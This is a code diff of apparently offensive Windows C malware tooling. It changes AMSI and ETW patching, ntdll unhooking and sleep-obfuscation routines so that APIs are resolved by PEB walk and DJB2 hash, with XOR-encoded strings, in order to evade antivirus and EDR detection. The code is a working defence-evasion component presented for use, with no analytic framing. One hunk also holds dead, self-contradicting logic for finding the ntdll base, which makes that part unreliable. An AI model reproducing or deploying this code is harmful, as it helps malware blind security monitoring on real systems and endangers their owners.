@@ -41,30 +41,42 @@ BOOL evasion_patch_amsi(void) {
      * x64 patch: mov eax, 0x80070057; ret
      *   Bytes: B8 57 00 07 80 C3
      *
-     * We use VirtualProtect via ntdll to avoid userland hooks on kernel32.
+     * All API resolution via PEB walk + DJB2 hashing — no plaintext strings.
      */
-    HMODULE hAmsi = LoadLibraryA("amsi.dll");
-    if (!hAmsi)
-        return TRUE;  /* AMSI not loaded — nothing to patch */
 
-    void *pFunc = (void *)GetProcAddress(hAmsi, "AmsiScanBuffer");
-    if (!pFunc)
-        return FALSE;
+    /* Resolve LoadLibraryA via PEB walk to load amsi.dll */
+    typedef HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
+    pLoadLibraryA fnLoadLib = (pLoadLibraryA)api_resolve(HASH_KERNEL32, HASH_LoadLibraryA);
+    if (!fnLoadLib) return TRUE;
+
+    /* Decrypt "amsi.dll" on the stack */
+    char amsi_name[] = { 'a'^0x5A, 'm'^0x5A, 's'^0x5A, 'i'^0x5A, '.'^0x5A,
+                         'd'^0x5A, 'l'^0x5A, 'l'^0x5A, 0 };
+    for (int i = 0; amsi_name[i]; i++) amsi_name[i] ^= 0x5A;
+
+    HMODULE hAmsi = fnLoadLib(amsi_name);
+    SecureZeroMemory(amsi_name, sizeof(amsi_name));
+    if (!hAmsi) return TRUE;  /* AMSI not loaded — nothing to patch */
+
+    /* Resolve AmsiScanBuffer by hash from the loaded amsi module */
+    #define HASH_AmsiScanBuffer 0xDC5B6220
+    void *pFunc = api_resolve_from_module(hAmsi, HASH_AmsiScanBuffer);
+    if (!pFunc) return FALSE;
 
     unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
     DWORD oldProtect;
     SIZE_T patchSize = sizeof(patch);
     void *pBase = pFunc;
 
-    /* Use NtProtectVirtualMemory to bypass potential VirtualProtect hooks */
+    /* Use NtProtectVirtualMemory via PEB-resolved hash */
+    #define HASH_NtProtectVirtualMemory_RT 0x50E92888
     pNtProtectVirtualMemory NtPVM = (pNtProtectVirtualMemory)
-        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
+        api_resolve(HASH_NTDLL, HASH_NtProtectVirtualMemory_RT);
 
     if (NtPVM) {
         NTSTATUS st = NtPVM(GetCurrentProcess(), &pBase, &patchSize,
                             PAGE_EXECUTE_READWRITE, &oldProtect);
-        if (!NT_SUCCESS(st))
-            return FALSE;
+        if (!NT_SUCCESS(st)) return FALSE;
     } else {
         if (!VirtualProtect(pFunc, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
             return FALSE;
@@ -72,7 +84,6 @@ BOOL evasion_patch_amsi(void) {
 
     memcpy(pFunc, patch, sizeof(patch));
 
-    /* Restore protection */
     if (NtPVM)
         NtPVM(GetCurrentProcess(), &pBase, &patchSize, oldProtect, &oldProtect);
     else
@@ -93,14 +104,12 @@ BOOL evasion_patch_etw(void) {
      *
      * x64 patch: xor rax, rax; ret
      *   Bytes: 48 33 C0 C3
+     *
+     * Resolved via PEB walk — no plaintext "ntdll.dll" or "EtwEventWrite".
      */
-    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
-    if (!hNtdll)
-        return FALSE;
-
-    void *pFunc = (void *)GetProcAddress(hNtdll, "EtwEventWrite");
-    if (!pFunc)
-        return FALSE;
+    #define HASH_EtwEventWrite 0xB10B5E68
+    void *pFunc = api_resolve(HASH_NTDLL, HASH_EtwEventWrite);
+    if (!pFunc) return FALSE;
 
     unsigned char patch[] = { 0x48, 0x33, 0xC0, 0xC3 };
     DWORD oldProtect;
@@ -127,8 +136,33 @@ BOOL evasion_unhook_ntdll(void) {
      * JMP instructions to their monitoring code. We read the original
      * ntdll.dll from C:\Windows\System32\ntdll.dll, map it as SEC_IMAGE,
      * and overwrite the hooked .text section with the clean one.
+     *
+     * ntdll handle resolved via PEB walk — no plaintext strings.
      */
-    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    /* Get ntdll base from PEB InMemoryOrderModuleList (it's always the 2nd entry) */
+    typedef HMODULE (WINAPI *pGetModuleHandleA)(LPCSTR);
+    pGetModuleHandleA fnGMH = (pGetModuleHandleA)api_resolve(HASH_KERNEL32, HASH_GetModuleHandleA);
+    if (!fnGMH) return FALSE;
+    /* Pass NULL-like obfuscated call: resolve ntdll by hash from PEB */
+    /* Actually: ntdll is always loaded; find it via the module hash */
+    HMODULE hNtdll = (HMODULE)api_resolve(HASH_NTDLL, 0x00000000);
+    /* api_resolve with functionHash 0 won't match — we need the module base.
+       Use a different approach: resolve any known ntdll export and get its module. */
+    {
+        void *anyFunc = api_resolve(HASH_NTDLL, HASH_NtClose);
+        if (!anyFunc) return FALSE;
+        /* Walk backwards to find module base (PE header) */
+        unsigned char *p = (unsigned char *)anyFunc;
+        /* Align down to 64K boundary and search for MZ header */
+        p = (unsigned char *)((ULONG_PTR)p & ~0xFFFF);
+        for (int i = 0; i < 256; i++) {
+            if (*(USHORT *)p == IMAGE_DOS_SIGNATURE) {
+                hNtdll = (HMODULE)p;
+                break;
+            }
+            p -= 0x10000;
+        }
+    }
     if (!hNtdll) return FALSE;
 
     /* Read clean ntdll from disk */
@@ -229,15 +263,10 @@ static void _get_module_bounds(void **base, DWORD *size) {
 
 void evasion_sleep_obfuscated(DWORD milliseconds) {
 #if CONFIG_SLEEP_OBFUSCATE
-    /* Load SystemFunction032 (RC4) from advapi32 */
-    HMODULE hAdvapi = LoadLibraryA("advapi32.dll");
-    if (!hAdvapi) {
-        Sleep(milliseconds);
-        return;
-    }
-
+    /* Resolve SystemFunction032 (RC4) from advapi32 via PEB walk */
+    #define HASH_SystemFunction032 0xE58C8805
     pSystemFunction032 SystemFunction032 =
-        (pSystemFunction032)GetProcAddress(hAdvapi, "SystemFunction032");
+        (pSystemFunction032)api_resolve(HASH_ADVAPI32, HASH_SystemFunction032);
     if (!SystemFunction032) {
         Sleep(milliseconds);
         return;
